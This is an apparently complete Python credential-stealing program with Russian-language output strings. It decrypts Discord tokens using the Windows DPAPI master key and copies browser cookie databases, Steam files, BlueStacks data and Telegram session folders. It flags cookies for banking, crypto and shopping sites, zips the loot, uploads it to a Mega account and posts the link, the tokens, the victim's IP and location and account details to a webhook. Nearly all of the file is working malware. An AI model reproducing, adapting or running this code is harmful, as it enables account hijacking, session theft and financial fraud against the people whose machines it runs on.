import os
import shutil
import subprocess
import traceback
import zipfile
import json
import re
from config import *
from base64 import b64decode
from re import findall


with open(os.devnull, 'w') as fnull:
    try:
        from mega import Mega
    except ModuleNotFoundError:
        subprocess.call(['pip', 'install', 'mega.py'], stdout=fnull, stderr=fnull)
    try:
        import requests
    except ModuleNotFoundError:
        subprocess.call(['pip', 'install', 'requests'], stdout=fnull, stderr=fnull)
    try:
        from Crypto.Cipher import AES
    except ModuleNotFoundError:
        subprocess.call(['pip', 'install', 'pycryptodome'], stdout=fnull, stderr=fnull)
    try:
        import psutil
    except ImportError:
        subprocess.call(['pip', 'install', 'psutil'], stdout=fnull, stderr=fnull)
    try:
        from win32crypt import CryptUnprotectData
    except ModuleNotFoundError:
        subprocess.call(['pip', 'install', 'pywin32'], stdout=fnull, stderr=fnull)

try:
    from mega import Mega
except ImportError as e:
    traceback_message = traceback.format_exc()
    if "pip install --upgrade tenacity" in traceback_message:
        subprocess.call(['pip', 'install', '--upgrade', 'tenacity'], stdout=fnull, stderr=fnull)
    else:
        print(e)

work_directory = 'C:/WorkDirectory'
user_folder = os.path.expanduser("~")

def globalInfo():
    ip = str(get_my_ip())
    username = os.getenv("USERNAME")
    
    response = requests.get(f'https://geolocation-db.com/jsonp/{ip}').text.replace('callback(', '').replace('})', '}')
    
    ipdata = json.loads(response)
    
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    sehir = ipdata["state"]

    globalinfo = f":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`"
    return globalinfo

def collect_discord_tokens():
    encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
    regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
    paths = {
        'Discord': r'C:\\Users\\reyzov_developer\\AppData\\Roaming\\discord\\Local Storage\\leveldb',
        'Discord Canary': r'C:\\Users\\reyzov_developer\\AppData\\Roaming\\discordcanary\\Local Storage\\leveldb\\',
        'Lightcord': r'C:\\Users\\reyzov_developer\\AppData\\Roaming\\Lightcord\\Local Storage\\leveldb\\',
        'Discord PTB': r'C:\\Users\\reyzov_developer\\AppData\\Roaming\\discordptb\\Local Storage\\leveldb\\'
    }   

    result = set()

    for name, path in paths.items():
            if not os.path.exists(path):
                continue
            if "cord" in path:
                if os.path.exists('C:\\Users\\reyzov_developer\\AppData\\Roaming\\discord\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in findall(encrypted_regex, line):
                                token = decrypt_val(b64decode(
                                    y.split('dQw4w9WgXcQ:')[1]), get_master_key('C:\\Users\\reyzov_developer\\AppData\\Roaming\\discord\\Local State'))
                                result.add(token)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in findall(regex, line):
                            result.add(token)
    
    return result

def get_master_key(path):
    c = ''
    with open(path, "r", encoding="utf-8") as f:
            c = f.read()
    local_state = json.loads(c)
    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_val(buff, master_key) -> str:
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception:
        return "Ошибка: Перезапустите программу"

def remove_empy_dirs(directory):
    for dirpath, dirnames, filenames in os.walk(directory, topdown=False):
        for dirname in dirnames:
            folder_path = os.path.join(dirpath, dirname)
            if not os.listdir(folder_path):
                os.rmdir(folder_path)

def steal_cookies():
    try:
        shutil.rmtree(work_directory)
    except FileNotFoundError:
        pass
    if not os.path.exists(work_directory):
        os.mkdir(work_directory)
        os.chdir(work_directory)
        os.mkdir('Yandex')
        os.mkdir('Google')
        os.mkdir('Steam')
        os.mkdir('BlueStacks')
        os.mkdir('Atom')
        os.mkdir('Telegram Session')
        os.chdir(work_directory)
    
    paths = []
    google = os.path.join(user_folder, 'AppData', 'Local', 'Google', 'Chrome',
                                'User Data', 'Default', 'Network', 'Cookies')
    yandex = os.path.join(user_folder, 'AppData', 'Local', 'Yandex', 'YandexBrowser',
                                'User Data', 'Default', 'Network', 'Cookies')
    steam = os.path.join(user_folder, 'AppData', 'Local', 'Steam', 'local.vdf')
    blue_stacks = os.path.join('C:/ProgramData/BlueStacks/Engine/Android/Data_0.vdi')
    atom = os.path.join(user_folder, 'AppData', 'Local', 'Mail.ru', 'Atom', 'User Data', 'Default',
                        'Network', 'Cookies')
    telegram = os.path.join(user_folder, 'AppData', 'Roaming', 'Telegram Desktop', 'tdata')

    if yandex:
        paths.append(yandex)
    if google:
        paths.append(google)
    if steam:
        paths.append(steam)
    if blue_stacks:
        paths.append(blue_stacks)
    if atom:
        paths.append(atom)
    if telegram:
        paths.append(telegram)

    if paths is not []:
        for cookie in paths:
            if 'Chrome' in cookie:
                os.chdir(work_directory + '/Google')
                try:
                    shutil.copy(google, work_directory + '/Google')
                    shutil.copy(google.replace('Network\\Cookies', 'Extension Cookies'), work_directory + '/Google')
                except FileNotFoundError:
                    pass
                os.chdir(work_directory)
            elif 'Atom' in cookie:
                os.chdir(work_directory + '/Atom')
                try:
                    shutil.copy(atom, work_directory + '/Atom')
                    shutil.copy(atom.replace('Network\\Cookies', 'Extension Cookies'), work_directory + '/Atom')
                except FileNotFoundError:
                    pass
                os.chdir(work_directory)
            elif 'YandexBrowser' in cookie:
                os.chdir(work_directory + '/Yandex')
                try:
                    shutil.copy(yandex, work_directory + '/Yandex')
                    shutil.copy(yandex.replace('Network\\Cookies', 'Extension Cookies'), work_directory + '/Yandex')
                except FileNotFoundError:
                    pass
                os.chdir(work_directory)
            elif 'Steam' in cookie:
                os.chdir(work_directory + '/Steam')
                try:
                    shutil.copy(steam, work_directory + '/Steam')
                except FileNotFoundError:
                    pass
                os.chdir(work_directory)
            elif 'BlueStacks' in cookie:
                os.chdir(work_directory + '/BlueStacks')
                try:
                    shutil.copy(blue_stacks, work_directory + '/BlueStacks')
                except FileNotFoundError:
                    pass
                os.chdir(work_directory)
            elif 'Telegram' in cookie:
                os.chdir(work_directory + '/Telegram Session/')
                try:
                    for item in os.listdir(cookie):
                        source = os.path.join(cookie, item)
                        destination = os.path.join(work_directory + '/Telegram Session/', item)

                        if item.lower() == 'user_data':
                            continue

                        if os.path.isdir(source):
                            shutil.copytree(source, destination)
                        else:
                            shutil.copy2(source, destination)
                except:
                    pass
                os.chdir(work_directory)
        
        for pathz in paths:
            if 'Google' or 'Yandex' or 'Atom' in pathz:
                try:
                    get_cookie_list(pathz)
                except Exception:
                    pass
        remove_empy_dirs(work_directory)

def get_cookie_list(cookie_path):
    from sqlite3 import connect
    connection = connect(cookie_path)
    cursor = connection.cursor()
    result = cursor.execute('SELECT * FROM cookies')

    for data in result.fetchall():
        check_target_hostname(data[1].replace('.', ' '))
    
    connection.close()

result = set()

def check_target_hostname(host):
    if 'vk' in host:
        result.add('ВКонтакте')
    elif 'openai' in host:
        result.add('OpenAI')
    elif 'zelenka' in host:
        result.add('Zelenka')
    elif 'yandex' in host:
        result.add('Yandex')
    elif 'mail ru' in host:
        result.add('Mail.Ru')
    elif 'youtube' in host:
        result.add('YouTube')
    elif 'google' in host:
        result.add('Google')
    elif 'github' in host:
        result.add('GitHub')
    elif 'pinterest' in host:
        result.add('Pinterest')
    elif 'yoomoney' in host:
        result.add('Yoo Money')
    elif 'qiwi' in host:
        result.add('Qiwi')
    elif 'yougame' in host:
        result.add('YouGame')
    elif 'metamask' in host:
        result.add('Metamask')
    elif 'trustwallet' in host:
        result.add('Trust wallet')
    elif 'ozon' in host:
        result.add('Ozon')
    elif 'wildberries' in host:
        result.add('Wildberries')
    elif 'mega' in host:
        result.add('Mega')
    elif 'telegram' in host:
        result.add('Telegram')
    elif 'ok' in host:
        result.add('Ok')
    elif 'pornhub' in host:
        result.add('PornHub')
    elif 'steam' in host:
        result.add('Steam')
    elif 'binance' in host:
        result.add('**Binance**')
    elif 'bybit' in host:
        result.add('**Bybit**')
    elif 'coinbase' in host:
        result.add('**Coinbase**')
    elif 'discord' in host:
        result.add("Discord")
    elif 'epicgames' in host:
        result.add("EpicGames")
    elif 'card' in host:
        result.add('Card')
    elif 'spotify' in host:
        result.add('Spotify')
    elif 'minectaft' in host:
        result.add('Minecraft')
    elif 'vpn' in host:
        result.add('Vpn')
    elif 'netflix' in host:
        result.add('Netflix')
    elif 'amazon' in host:
        result.add('**Amazon**')
    elif 'shopify' in host:
        result.add('**Shopify**')
    elif 'ebay' in host:
        result.add('ebay')

def get_token_info(token):
    url = 'https://discord.com/api/v9/users/@me'
    headers = {'Authorization': token}
    response = requests.get(url, headers=headers).text
    result = json.loads(response)
    return f'Юзернейм → {result["username"]}\nНик → {result["global_name"]}\nТелефон → {result["phone"]}\nПочта → {result["email"]}\nАйди → {result["id"]}'

def zip_pack(directory, zip_filename):
    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                if 'upload.zip' not in file_path:
                    arcname = os.path.relpath(file_path, directory)
                    zipf.write(file_path, arcname=arcname)


def upload_logs():
    msupload = Mega()
    msupload.login(mail, password)
    
    try:
        print('Пожалуйста подождите...')
        return msupload.get_upload_link(msupload.upload(work_directory + '/upload.zip'))
    except Exception as e:
        return e

def get_my_ip():
    try:
        response = requests.get('https://httpbin.org/ip')
        data = response.json()
        ip_address = data['origin']
        return ip_address
    except Exception:
        pass
    return 'Неизвестный :skull:'

def otstuk(upload_link, tokens, token_data):
    output_data = ""
    for data in result:
        output_data += data + ', '
    output_data = output_data[:-2]
    t = ''
    for token in tokens:
        t += token + '\n'
    payload = {
            'content': f'{str(globalInfo())}\n'
                   '**Общее**\n'
                   f'Ссылка → <{upload_link}>\n'
                   f'Логи ↓ ```{output_data}```\n'
                   f'**Discord**\n'
                   f'Токены ↓ ```{str(t)[:-2]}```\n'
                   f'Информация о аккаунте ↓ ```{token_data}```'
    }
    try:
        requests.post(webhook, data=json.dumps(payload), headers={'Content-Type': 'application/json'})
    except Exception:
        pass


ds_tokens = collect_discord_tokens()
token_data = get_token_info(*ds_tokens)
steal_cookies()
zip_pack(work_directory, 'upload.zip')
logs_link = upload_logs()
otstuk(logs_link, ds_tokens, token_data)